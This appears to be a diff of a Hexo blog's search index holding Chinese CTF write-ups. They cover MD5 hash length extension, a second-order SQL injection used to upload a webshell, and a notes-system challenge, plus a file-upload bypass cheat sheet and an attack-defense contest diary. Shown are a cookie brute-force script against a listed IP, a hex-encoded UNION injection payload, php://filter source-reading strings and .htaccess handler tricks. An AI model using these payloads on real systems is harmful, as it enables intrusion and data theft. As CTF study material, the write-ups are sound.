+      <content type="html"><![CDATA[<h3 id="Hash-Length-Extension-Attack"><a href="#Hash-Length-Extension-Attack" class="headerlink" title="Hash Length Extension Attack"></a>Hash Length Extension Attack</h3><p>&emsp;&emsp;总体来说就是我们知道一个加盐的hash值，即使我们不知道盐的具体内容，但只要知道长度就可以随便伪造种带盐的hash（相当于我们控制了明密文）<br><br></p><h1 id="MD5加密原理"><a href="#MD5加密原理" class="headerlink" title="MD5加密原理"></a>MD5加密原理</h1><p>先介绍一下md5加密的原理<br><img src="\images\pasted-25.png" alt="upload successful"></p><p>个人理解: md5的过程可以分成<strong>填充</strong>和<strong>压缩</strong>的过程<br></p><ul><li>md5 padding(填充)<br>&emsp;&emsp;message padding<br>&emsp;&emsp;length%64=56(8位标识原始长度)<br>填充的时候，将会使用16进制数据：<br>&emsp;~1个\x80<br>&emsp;~N个\0x00      </li><li>md5 compress(压缩)<br>&emsp;&emsp;message padding length—–&gt;hash<br>&emsp;&emsp;length=N*64(bit)      —–&gt;length%64(bit)<br><br></li></ul><h2 id="md5-padding"><a href="#md5-padding" class="headerlink" title="md5 padding"></a>md5 padding</h2><p><em>例如我们把admin来hash一下:</em><br>admin  先hex编码-&gt;61646d696e<br>再填充80<br>不满64bit，填充到第56位（50个00）——为了保证信息的长度为N*64+56(字节)<br>最后数据表示位2800000000000000（8个字节）<br>最终结果为:</p><blockquote><p>61646d6968000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000<br><br></p></blockquote><p><strong>什么是Magic number (确定值)</strong><br>代码中的0x67452301L, 0xefcdab89L, 0x98badcfeL, 0x10325476L这4个初始化的number就被称为Magic number或者是md5 iv (md5向量)<br><br><br></p><h2 id="md5-compress"><a href="#md5-compress" class="headerlink" title="md5 compress"></a>md5 compress</h2><p>我们发现，无论输入多长的信息，计算出来的问就按hash长度都是固定的(md5有32字节)，这就是因为hash算法是一种压缩算法。<br>Hash设计的时候不要求还原，所以就尽可能的扩大信息对每一位hash值的印象。在计算中，也是通过对每组长度为64bit信息分组进行迭代运算实现的。<br>每一次迭代，都会利用一个初始值与本组中的原始信息做一个复杂的数学运算，而将生成的结果带入到下次的复杂运算中作为初始值<br><br><br>我们还是计算admin的md5值。因为不满64bit,所以padding之后也只有64个bit，也就需要计算一轮compress压缩算法。压缩算法完成后产生的心magic number为：<br>A=0x292f2321L<br>B=0xa7a5577aL<br>C=0xe4a8943L<br>D=0xc31f804aL<br>而md5的结果:<br><img src="\images\pasted-26.png" alt="upload successful"><br>我们发现其实就是这一轮结果的简单拼接（小端存储数据倒叙）<br><br></p><h1 id="hash长度拓展攻击"><a href="#hash长度拓展攻击" class="headerlink" title="hash长度拓展攻击"></a>hash长度拓展攻击</h1><p>其实只要知道三点后就能进行攻击：</p><ul><li>MD5(salt+message)的值</li><li>message内容</li><li>salt+message长度<br>这样就可以在不知道salt的具体内容下，计算出任意的md5(salt+message+padding+append)值<br>因为salt+message+padding内容是经过填充的，一定是N*64，所以这个部分刚好能完成N轮复杂运算。而他的结果，也就是md5(salt+message+padding)刚好是用来做下一轮运算，也就是m’+padding运算的初始向量。<br><img src="\images\pasted-27.png" alt="upload successful"></li></ul><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>逆向算法很简单</p><pre><code>def compute_magic_number(self, md5str):    self.A = struct.unpack(&quot;I&quot;, md5str[0:8].decode(&apos;hex&apos;))[0]    self.B = struct.unpack(&quot;I&quot;, md5str[8:16].decode(&apos;hex&apos;))[0]    self.C = struct.unpack(&quot;I&quot;, md5str[16:24].decode(&apos;hex&apos;))[0]    self.D = struct.unpack(&quot;I&quot;, md5str[24:32].decode(&apos;hex&apos;))[0]</code></pre><p>由它逆出A=0x292f2321L,B=0xa7a5577aL,C=0xe4a8943L,D=0xc31f804aL<br>根据这4个Magci number，再和扩展的字符串m’(此时的m’要进行padding，padding的长度是len(salt+message+padding+m’))进行md5 compress，最后的结果即md5(salt+message+padding+m’)<br>这样就完成了长度拓展攻击</p><h2 id="例题测试"><a href="#例题测试" class="headerlink" title="例题测试"></a>例题测试</h2><h3 id="实验吧-让我进去"><a href="#实验吧-让我进去" class="headerlink" title="实验吧-让我进去"></a>实验吧-让我进去</h3><p>抓包改source，Repeater过去发现源码</p><pre><code>$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;$secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security      $username = $_POST[&quot;username&quot;];$password = $_POST[&quot;password&quot;];if (!empty($_COOKIE[&quot;getmein&quot;])) {    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) {        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {            echo &quot;Congratulations! You are a registered user.\n&quot;;            die (&quot;The flag is &quot;. $flag);        }        else {            die (&quot;Your cookies don&apos;t match up! STOP HACKING THIS SITE.&quot;);        }    }    else {        die (&quot;You are not an admin! LEAVE.&quot;);    }}setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE[&quot;source&quot;])) {setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));}else {    if ($_COOKIE[&quot;source&quot;] != 0) {        echo &quot;&quot;; // This source code is outputted here    }}</code></pre><p>按照源码要求，cookie中要存在变量getmein，而且，要 $COOKIE[“getmein”] === md5($secret . urldecode($username . $password))<br>sample-hash是secret+adminadmin的MD5<br><img src="\images\pasted-67.png" alt="upload successful"><br>这里secret相当于盐，我们并不知道，但是我们知道它的长度是15，算上后面admin就是20。<br>数据是admin<br>签名（哈希值）是571580b26c65f306376d4f64e53cb5c7<br><img src="\images\pasted-68.png" alt="upload successful"><br>生成的hash是新的签名，设置到cookies的getmein里面<br>把\x换成%后post提交，得到flag<br><img src="\images\pasted-69.png" alt="upload successful"></p>]]></content>
+      
       <categories>
-        <category>CTF</category>
-        <category>web</category>
+          
+          <category> CTF </category>
+          
+          <category> web </category>
+          
       </categories>
-      <tags>
-        <tag>代码审计</tag>
-        <tag>二次注入</tag>
-        <tag>php函数漏洞</tag>
-        <tag>php伪协议</tag>
-        <tag>CSRF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[文件管理系统writeup]]></title>
-    <url>%2F2018%2F04%2F08%2Fday1%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%2F</url>
-    <content type="text"><![CDATA[文件上传之代码审计前几天做了一道有趣的web题，涉及到文件上传，代码审计，二次注入。 首先是一个文件管理系统，上传文件，重命名文件，删除文件的功能。也给出了网站源码。先审计代码，看一下upload.php文件上传函数，先看服务器怎么检查文件的，可以看到$pat_part[“extension”]不允许php上传其中文件名 也被addslashes函数过滤，转义了一些字符，因此这里应该不存在注入 文件名存在数据库两个字段中，一个是filename（文件名），一个是extension（后缀名） 可以看出来文件名走过的流程是：$file[‘name’]—&gt;pathinfo()—&gt;$path_part[‘filename’]—&gt;addslashes()—&gt;insert 再看一下rename.php首先查询文件名，如果存在，执行sql语句根据$req[‘filename’]从数据库里查询到已存在的一行，并调用update语句进行修改 但在这里{oldname=[‘filename’]}将从数据库里查出的$result[‘filename’]再一次入库，结果造成一个二次注入 如果我们可以插入让extension的值为空，再把文件名在改名为.php就可以解析了 那么思路很明确，我们上传一个有恶意字段的jpg文件，然后rename进数据库，让后缀名变为空，然后再上传一个木马文件，由于extension为空，所以再次修改的时候不会加上.jpg的扩展名。 解题步骤： 上传文件名为’,extension=’’,filename=’aa.jpg.jpg 这样filename的值为’,extension=’’,filename=’aa.jpg 我们重命名把’,extension=’’,filename=’aa.jpg改为aa.jpg 这时我们再次上传一个写有木马的文件，文件名为aa.jpg 此时不会提示file is exists 因为extension!=jpg 将aa.jpg改为aa.php即可]]></content>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> crypto </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>蓝鲸笔记系统writeup</title>
+      <link href="/2018/04/10/%E8%93%9D%E9%B2%B8%E7%AC%94%E8%AE%B0%E7%B3%BB%E7%BB%9Fwriteup/"/>
+      <url>/2018/04/10/%E8%93%9D%E9%B2%B8%E7%AC%94%E8%AE%B0%E7%B3%BB%E7%BB%9Fwriteup/</url>
+      <content type="html"><![CDATA[<h4 id="蓝鲸笔记系统"><a href="#蓝鲸笔记系统" class="headerlink" title="蓝鲸笔记系统"></a>蓝鲸笔记系统</h4><p>给出一个login界面，url看上去似乎有问题<br><br><a href="http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=login" target="_blank" rel="noopener">http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=login</a><br><br>感觉像是有文件包含<br><br>随便尝试一下<a href="http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=index" target="_blank" rel="noopener">http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=index</a><br><br><img src="\images\pasted-0.png" alt="upload successful"><br>果然是文件包含。先随便注册一个账号进去看看，发现 hint:./dbinit.sql</p><p><img src="\images\pasted-4.png" alt="upload successful"><br>发现了flag字段，flag应该就是在数据库里面了</p><p>肯定是文件包含无疑了，相办法读源码</p><h5 id="利用php伪协议读源码："><a href="#利用php伪协议读源码：" class="headerlink" title="利用php伪协议读源码："></a>利用php伪协议读源码：</h5><p>php://filter/read=convert.base64-encode/resource=<br><img src="\images\pasted-5.png" alt="upload successful"><br>不让读，真尴尬</p><p>然后仔细看了看url，猜测这个front是文件夹名，login是文件名<br><a href="http://202.98.28.108:10013/7sghfe673jd3/front/index.php" target="_blank" rel="noopener">http://202.98.28.108:10013/7sghfe673jd3/front/index.php</a><br><img src="\images\pasted-6.png" alt="upload successful"><br><img src="\images\pasted-7.png" alt="upload successful"><br>还是拒绝访问…</p><p>猜测后台脚本是这样写的:<br><br>include($action.’/‘.$mode.’.php’)<br><br>require”$action.’/‘.$mode.’.php’”</p><p><img src="\images\pasted-8.png" alt="upload successful"><br>成功读出来了！！！<br><br>login不让读，但是审计index.php的源码时发现common.php，顺便把源码也down下来</p><h5 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h5><p>先看一下index.php，并没有发现什么东西<br>在common.php中发现一些定义的函数</p><p>御剑扫一下，发现/admin/login.php , /admin/index.php，把源码都down下来<br><br>在/admin/login.php中发现<br><img src="\images\pasted-9.png" alt="upload successful"></p><p>/admin/login.php,调用了set_login()函数</p><p><img src="\images\pasted-10.png" alt="upload successful"></p><p>/front/common.php中有set_login()函数的定义</p><p><img src="\images\pasted-11.png" alt="upload successful"></p><p><img src="\images\pasted-12.png" alt="upload successful"></p><p><img src="\images\pasted-13.png" alt="upload successful"></p><p><img src="\images\pasted-14.png" alt="upload successful"></p><p>来到<a href="http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=login" target="_blank" rel="noopener">http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=login</a></p><p><img src="\images\pasted-15.png" alt="upload successful"><br>跟踪一下这几个函数，这里设置了cookies和session。可以看出来最后set_cookie的值是$uname|$endata<br>$uname是admin。则cookie是 admin|md5(SECURITY_KEY+admin) <br><br>SECURITY_KEY 是个随机数，每一位是从wh两个字母中随机出来的6位随机数</p><p>看一下后台登陆验证</p><p><img src="\images\pasted-16.png" alt="upload successful"><br>两个函数在common.php中</p><p><img src="\images\pasted-17.png" alt="upload successful"></p><p><img src="\images\pasted-18.png" alt="upload successful"><br>这里验证了userid和level，如果cookie验证失败，则返回false，level如果是0，也返回false。</p><p>但是如果我们没有登陆，直接来到/admin/index.php页面，而且绕过cookie的验证，那么userid和level的默认初始值都是null。在php中，<br>null!==False</p><blockquote><blockquote><p>True<br>null!=False<br>False<br>$null!==false是返回true的。所以只要我们能伪造cookie，就可以绕过验证。</p></blockquote></blockquote><h5 id="爆破cookie脚本"><a href="#爆破cookie脚本" class="headerlink" title="爆破cookie脚本"></a>爆破cookie脚本</h5><pre><code>import requestsimport hashlibimport randomimport stringfalse_tag = &quot;not login!&quot;url = &quot;http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=index&quot;url_csrf = &quot;http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=login&quot;def rand_str(length):    return &apos;&apos;.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))def md5_encode(data):    hash = hashlib.md5()    hash.update((data + &quot;admin&quot;).encode())    return hash.hexdigest()key = []for x1 in [&quot;w&quot;,&quot;h&quot;]:    for x2 in [&quot;w&quot;,&quot;h&quot;]:        for x3 in [&quot;w&quot;,&quot;h&quot;]:            for x4 in [&quot;w&quot;,&quot;h&quot;]:                for x5 in [&quot;w&quot;,&quot;h&quot;]:                    for x6 in [&quot;w&quot;,&quot;h&quot;]:                        key.append(x1+x2+x3+x4+x5+x6)                        print keys = requests.Session()    s.headers = {        &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36&apos;,        &apos;cookie&apos;: &apos;&apos;    }for x in key:       s.headers[&quot;cookie&quot;] = &quot;uid=admin%7C&quot;+md5_encode(x)#+&quot;;&quot;+&quot;PHPSESSID={}&quot;.format(rand_str(26))    s.headers[&quot;PHPSESSID&quot;] = rand_str(26)    print s.headers[&quot;cookie&quot;]    result = s.get(url)    #print result.content    if false_tag in result.content:        print &quot;NO&quot;,x    else:        print &quot;YES&quot;        print s.headers        print result.content        break</code></pre><p><img src="\images\pasted-19.png" alt="upload successful"></p><p>发现setpagenumu页面，down下来源码</p><p><img src="\images\pasted-20.png" alt="upload successful"></p><h5 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h5><p>发现post的page是用户可以输入<br>但是类型限制了纯数字，应该是没有办法注入</p><p>回去审计/admin/index.php</p><p><img src="\images\pasted-21.png" alt="upload successful"><br>发现数据库里查询的是$page_size,跟踪get_page_size(),</p><p><img src="\images\pasted-22.png" alt="upload successful"><br>get_page_size()函数返回num，也就是index里面的$page_size<br>感觉应该能注入，回去看数据库文件</p><p><img src="\images\pasted-23.png" alt="upload successful"><br>发现数据库里定义的page是varchar类型<br>标准的脚本代码与数据库类型不匹配<br>利用is_numeric()函数的漏洞(认为0x…是整数)，构造一个二次注入</p><p>数据库文件中可以看到一共有四个列</p><p><img src="\images\pasted-24.png" alt="upload successful"><br>构造注入语句<br>2 union select 1,flag,flag,4 from flags<br>转成十六进制注入即可拿到flag<br>0x3220756e696f6e2073656c65637420312c666c61672c666c61672c342066726f6d20666c616773</p>]]></content>
+      
       <categories>
-        <category>CTF</category>
-        <category>web</category>
+          
+          <category> CTF </category>
+          
+          <category> web </category>
+          
       </categories>
-      <tags>
-        <tag>文件上传</tag>
-        <tag>代码审计</tag>
-        <tag>二次注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Hello World]]></title>
-    <url>%2F2018%2F04%2F07%2Fhello-world%2F</url>
-    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
-  </entry>
-  <entry>
-    <title><![CDATA[RSA总结]]></title>
-    <url>%2F2018%2F04%2F06%2Frsa%E6%80%BB%E7%BB%93%2F</url>
-    <content type="text"><![CDATA[先留个坑，回头写…]]></content>
+      
+      
+        <tags>
+            
+            <tag> 代码审计 </tag>
+            
+            <tag> 二次注入 </tag>
+            
+            <tag> php函数漏洞 </tag>
+            
+            <tag> php伪协议 </tag>
+            
+            <tag> CSRF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>文件管理系统writeup</title>
+      <link href="/2018/04/08/day1%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
+      <url>/2018/04/08/day1%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
+      <content type="html"><![CDATA[<h3 id="文件上传之代码审计"><a href="#文件上传之代码审计" class="headerlink" title="文件上传之代码审计"></a>文件上传之代码审计</h3><p>前几天做了一道有趣的web题，涉及到文件上传，代码审计，二次注入。</p><p>首先是一个文件管理系统，上传文件，重命名文件，删除文件的功能。也给出了网站源码。<img src="\images\pasted-1.png" alt="upload successful"><br>先审计代码，看一下upload.php<br><img src="\images\pasted-2.png" alt="upload successful"><br>文件上传函数，先看服务器怎么检查文件的，可以看到$pat_part[“extension”]不允许php上传<br>其中文件名 也被addslashes函数过滤，转义了一些字符，因此这里应该不存在注入</p><p>文件名存在数据库两个字段中，一个是filename（文件名），一个是extension（后缀名）</p><p>可以看出来文件名走过的流程是：<br>$file[‘name’]—&gt;pathinfo()—&gt;$path_part[‘filename’]—&gt;addslashes()—&gt;insert</p><p>再看一下rename.php<br><img src="\images\pasted-3.png" alt="upload successful"><br>首先查询文件名，如果存在，执行sql语句<br>根据$req[‘filename’]从数据库里查询到已存在的一行，并调用update语句进行修改</p><p>但在这里{oldname=[‘filename’]}将从数据库里查出的$result[‘filename’]再一次入库，结果造成一个二次注入</p><p>如果我们可以插入让extension的值为空，再把文件名在改名为.php就可以解析了</p><p>那么思路很明确，我们上传一个有恶意字段的jpg文件，然后rename进数据库，让后缀名变为空，然后再上传一个木马文件，由于extension为空，所以再次修改的时候不会加上.jpg的扩展名。</p><h5 id="解题步骤："><a href="#解题步骤：" class="headerlink" title="解题步骤："></a>解题步骤：</h5><blockquote><ul><li>上传文件名为’,extension=’’,filename=’aa.jpg.jpg</li><li>这样filename的值为’,extension=’’,filename=’aa.jpg</li><li>我们重命名把’,extension=’’,filename=’aa.jpg改为aa.jpg</li><li>这时我们再次上传一个写有木马的文件，文件名为aa.jpg</li><li>此时不会提示file is exists 因为extension!=jpg</li><li>将aa.jpg改为aa.php即可</li></ul></blockquote>]]></content>
+      
       <categories>
-        <category>密码学</category>
+          
+          <category> CTF </category>
+          
+          <category> web </category>
+          
       </categories>
-      <tags>
-        <tag>crypto</tag>
-        <tag>rsa</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[文件上传常规漏洞总结]]></title>
-    <url>%2F2018%2F04%2F01%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%B8%B8%E8%A7%84%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%2F</url>
-    <content type="text"><![CDATA[从文件上传到getshell一般找到文件上传页面，常规getshell思路:先检查服务器验证上传文件的逻辑，再想办法绕过 前台js验证——禁用js，burpsuit抓包绕过即可 后台检查MIME——抓包改MIME 后台文件内容检测——(一般是用GetImageSize函数) 制作图片马上传 .hatccess上传(apache)——创建一个.hatccseea文件设置命名有”php.gif”的文件当作php文件解析执行：&lt;FilesMatch “php.gif”&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 上传的jpg文件都会以php格式解析：AddType application/x-httpd-php .jpg 后台检查文件后缀名—— 0x00截断上传 (php版本小于5.3.4，php的magic_quotes_gpc为OFF)1.php .png(空格改为00) IIS6.0解析漏洞文件 xxx.asp;.jpg (服务器默认不解析;号后面的内容) 文件夹 xxx.asp/xxx.jpg (服务器默认会把.asp，.asp目录下的文件都解析成asp文件) apache解析漏洞www.xxx.com/logo.jpg.php.xxx(遇到不识别的后缀名向前解析) iis7.0和nginx解析漏洞www.xxx.com/logo.jpg/*.php(开启fix_pathinfo) 文件包含漏洞和利用 如果php脚本中使用了include,include_once,reqiure,requier_once这四个函数，并且函数的参数是用户可以控制的，就能造成文件包含漏洞 通常的include函数中，就算是可以控制参数但是后缀名也大多被限制，例如include($file.’.txt’)这样就只能包含txt文件。这时我们可以结合%00截断包含任意文件。index.php%00 文件包含漏洞也可以结合php伪协议，例如php://,phar://等等(php://input甚至可以写入木马)。例如文件包含进来但是无法显示时，可以用伪协议读文件的源码(php://filter/read=convert.base64-encode/resourse=包含文件)]]></content>
+      
+      
+        <tags>
+            
+            <tag> 文件上传 </tag>
+            
+            <tag> 代码审计 </tag>
+            
+            <tag> 二次注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>Hello World</title>
+      <link href="/2018/04/07/hello-world/"/>
+      <url>/2018/04/07/hello-world/</url>
+      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
+      
+      
+    </entry>
+    
+    <entry>
+      <title>RSA总结</title>
+      <link href="/2018/04/06/rsa%E6%80%BB%E7%BB%93/"/>
+      <url>/2018/04/06/rsa%E6%80%BB%E7%BB%93/</url>
+      <content type="html"><![CDATA[<p>先留个坑，回头写…</p>]]></content>
+      
       <categories>
-        <category>文件上传</category>
+          
+          <category> 密码学 </category>
+          
       </categories>
-      <tags>
-        <tag>文件上传</tag>
-        <tag>web</tag>
-        <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[第一次攻防训练赛小记]]></title>
-    <url>%2F2018%2F04%2F01%2F%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E8%AE%AD%E7%BB%83%E8%B5%9B%E5%B0%8F%E8%AE%B0%2F</url>
-    <content type="text"><![CDATA[&emsp;&emsp;昨天按照实验室的要求，我们参加了个人的第一场ctf攻防形式的训练赛。形式是线上赛，由师傅搭好的环境，总体来说收获还是很大的，见识到了很多有(yin)趣(xian)的套路。总结一下 &emsp;&emsp;先说一下规则，一个五个队伍，每队两人。因为是训练，只有三道Web题，拿到其他队的flag加十分，被攻击队伍扣除相应分数。重启服务器扣除300分。五分钟一回合，宕机一回合扣除 (未宕机队伍的数量)*3 ，分数平均加到相应的队伍。（过程中发现一个骚操作就是当其他队伍宕机了，你还可以用之前上的shell拿flag，这样相当于多加了一部分分数） 第一道题是semcms1.1版本，上网查到相应漏洞，首先注入找到后台密码，后台有个任意文件上传，上一张图片马直接getshell，连菜刀顺利拿到flag。但是大佬们更快一步，已经吊打我们而且把洞修好了… 第三题是一个微窗cms，有一个命令执行的洞。稍微有一点点麻烦，这个好像没法上shell，直接构造命令执行语句也能读出flag 第二题最骚，页面发现一个神奇md5，解密后发现是ranzhi，搜了一些poc都用不了，最后也没做出来。最后师傅们分享write up后发现website源码里有一个预留后门，直接菜刀拿shell！！！(hao qi ya)正规解法是mysql查询到登录密码，登陆进去有一个上shell的地方。本菜代码审计能力太差，也没看懂 这次比赛下来身为小白总结了几点：&emsp;&emsp;对于一个攻防比赛，最开始并不是攻击，也不是防御。二话不说ssh连上自己website把源码备份一遍。这样以来，如果以后不慎自己服务器宕机了，还有复原的机会。 1234攻击方面： 拿到一个Web，黑盒找漏洞就比较简单，上网搜对应的资料。 白盒的话就是代码审计，打包下载到本地，利用代码审计工具Seay快速审计。 还有就是看看对数据库的操作有没有限制，这次就是出题人对mysql并没有任何限制，也就是说很多东西我们直接可以从数据库里找。还有就是看一下有没有出题人留得后门。 12345防御方面：首先猜测防御规则， 不要再防守的时候吧自己服务器给干掉了。 通用防御：上waf，直接吧不想要的请求比如post，get全部给禁掉等等； 设置目录权限，例如上传目录权限给死。 最后一个也是最耗时间的，就是代码审计，找到漏洞存在的位置，修改代码。 &emsp;&emsp;比赛结束后的交流也见识到了一些骚套路，比如什么不死马，利用虚拟机做蜜罐专偷其他队伍shell什么的，zhang见识了，具体的操作有空再研究。奋斗ing…]]></content>
+      
+      
+        <tags>
+            
+            <tag> crypto </tag>
+            
+            <tag> rsa </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>第一次攻防训练赛小记</title>
+      <link href="/2018/04/01/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E8%AE%AD%E7%BB%83%E8%B5%9B%E5%B0%8F%E8%AE%B0/"/>
+      <url>/2018/04/01/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E8%AE%AD%E7%BB%83%E8%B5%9B%E5%B0%8F%E8%AE%B0/</url>
+      <content type="html"><![CDATA[<p>&emsp;&emsp;昨天按照实验室的要求，我们参加了个人的第一场ctf攻防形式的训练赛。形式是线上赛，由师傅搭好的环境，总体来说收获还是很大的，见识到了很多有(yin)趣(xian)的套路。总结一下</p><p>&emsp;&emsp;先说一下规则，一个五个队伍，每队两人。因为是训练，只有三道Web题，拿到其他队的flag加十分，被攻击队伍扣除相应分数。重启服务器扣除300分。五分钟一回合，宕机一回合扣除 (未宕机队伍的数量)*3 ，分数平均加到相应的队伍。（过程中发现一个骚操作就是当其他队伍宕机了，你还可以用之前上的shell拿flag，这样相当于多加了一部分分数） </p><blockquote><ul><li>第一道题是semcms1.1版本，上网查到<a href="http://0day5.com/archives/4320/" target="_blank" rel="noopener">相应漏洞</a>，首先注入找到后台密码，后台有个任意文件上传，上一张图片马直接getshell，连菜刀顺利拿到flag。但是大佬们更快一步，已经吊打我们而且把洞修好了…</li></ul></blockquote><blockquote><ul><li>第三题是一个微窗cms，有一个<a href="http://0day5.com/archives/3996/" target="_blank" rel="noopener">命令执行的洞</a>。稍微有一点点麻烦，这个好像没法上shell，直接构造命令执行语句也能读出flag</li></ul></blockquote><blockquote><ul><li>第二题最骚，页面发现一个神奇md5，解密后发现是ranzhi，搜了一些poc都用不了，最后也没做出来。最后师傅们分享write up后发现website源码里有一个预留后门，直接菜刀拿shell！！！(hao qi ya)<br>正规解法是mysql查询到登录密码，登陆进去有一个上shell的地方。本菜代码审计能力太差，也没看懂</li></ul></blockquote><p>这次比赛下来身为小白总结了几点：<br>&emsp;&emsp;对于一个攻防比赛，最开始并不是攻击，也不是防御。二话不说ssh连上自己website把源码备份一遍。这样以来，如果以后不慎自己服务器宕机了，还有复原的机会。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">攻击方面：</span><br><span class="line">    拿到一个Web，黑盒找漏洞就比较简单，上网搜对应的资料。</span><br><span class="line">    白盒的话就是代码审计，打包下载到本地，利用代码审计工具Seay快速审计。</span><br><span class="line">    还有就是看看对数据库的操作有没有限制，这次就是出题人对mysql并没有任何限制，也就是说很多东西我们直接可以从数据库里找。还有就是看一下有没有出题人留得后门。</span><br></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">防御方面：</span><br><span class="line">首先猜测防御规则， 不要再防守的时候吧自己服务器给干掉了。</span><br><span class="line">    通用防御：上waf，直接吧不想要的请求比如<span class="built_in">post</span>，<span class="built_in">get</span>全部给禁掉等等；</span><br><span class="line">    设置目录权限，例如上传目录权限给死。</span><br><span class="line">    最后一个也是最耗时间的，就是代码审计，找到漏洞存在的位置，修改代码。</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;比赛结束后的交流也见识到了一些骚套路，比如什么不死马，利用虚拟机做蜜罐专偷其他队伍shell什么的，zhang见识了，具体的操作有空再研究。奋斗ing…</p>]]></content>
+      
       <categories>
-        <category>CTF</category>
-        <category>AWD</category>
+          
+          <category> CTF </category>
+          
+          <category> AWD </category>
+          
       </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>AWD</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title></title>
-    <url>%2F404.html</url>
